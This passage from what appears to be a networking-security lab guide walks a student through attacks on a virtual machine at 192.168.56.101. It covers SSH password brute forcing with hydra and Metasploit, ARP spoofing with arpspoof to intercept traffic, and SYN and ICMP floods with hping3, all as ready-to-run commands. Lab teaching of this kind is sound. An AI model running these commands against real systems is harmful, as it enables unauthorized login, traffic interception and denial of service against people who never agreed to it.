## PHASE 2: ACCESS ATTACK

This maps to **"Access Attacks: Attempt a simulated password cracking or spoofing attack"**.

### Option A — SSH Brute Force (Password Cracking)

This simulates an attacker trying common passwords against SSH.

```bash
# Install hydra if not present
apt-get install hydra -y

# Create a simple password list
echo -e "password\n123456\nadmin\nroot\nletmein\ntoor" > passwords.txt

# Create a username list
echo -e "root\nadmin\nuser\nkali" > usernames.txt

# Run the brute force attack
hydra -L usernames.txt -P passwords.txt ssh://192.168.56.101 -t 4 -V
```

**What `-t 4` means:** Use 4 threads (slow it down to avoid overwhelming your VM).

**What to record:** Which username/password combination succeeded (if any).

---

### Option B — Metasploit SSH Login Scanner

```bash
# Launch Metasploit
msfconsole

# Inside Metasploit, use the SSH login scanner
use auxiliary/scanner/ssh/ssh_login

# Configure target
set RHOSTS 192.168.56.101
set RPORT 22

# Set credentials to try
set USERNAME root
set PASSWORD toor

# Or use files
set USER_FILE /root/usernames.txt
set PASS_FILE /root/passwords.txt

# Run it
run
```

---

### Option C — ARP Spoofing (Man-in-the-Middle)

This directly maps to **ARP Cache Poisoning** from your Cisco Module 17 reference material.

```bash
# Enable IP forwarding so traffic still flows (victim won't notice)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Install arpspoof if needed
apt-get install dsniff -y

# Open TWO terminals

# Terminal 1 — Tell victim (101) that YOU are the gateway
arpspoof -i eth0 -t 192.168.56.101 192.168.56.1

# Terminal 2 — Tell gateway that YOU are the victim
arpspoof -i eth0 -t 192.168.56.1 192.168.56.101
```

While ARP spoofing is running, open Wireshark to capture intercepted traffic. Filter with `arp` to see the poisoned ARP replies.

**Stop the attack:** Press `Ctrl+C` in both terminals when done.

---

### Option D — DoS Attack (SYN Flood)

This maps to **"DoS/DDoS Attacks: Ping of Death or SYN Flood"** from your assignment.

```bash
# Using hping3 (pre-installed on Kali)
# SYN flood — sends rapid TCP SYN packets with spoofed source IPs
hping3 -S --flood -V -p 80 192.168.56.101
```

**Stop after 10–15 seconds** with `Ctrl+C`. Check your Wireshark capture to see the flood.

```bash
# Ping of Death variant
hping3 --icmp --flood 192.168.56.101
```

